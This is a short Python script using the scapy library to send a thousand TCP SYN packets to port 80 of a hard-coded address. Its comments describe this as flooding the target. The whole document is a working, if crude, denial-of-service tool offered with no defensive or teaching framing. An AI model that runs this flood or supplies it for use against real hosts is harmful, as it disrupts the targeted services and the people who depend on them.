#!/usr/bin/env python3
from scapy.all import *

# target IP address and port
target_ip = "192.168.1.1"
target_port = 80

# flood the target with SYN packets
for x in range(1000):
  send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=False)

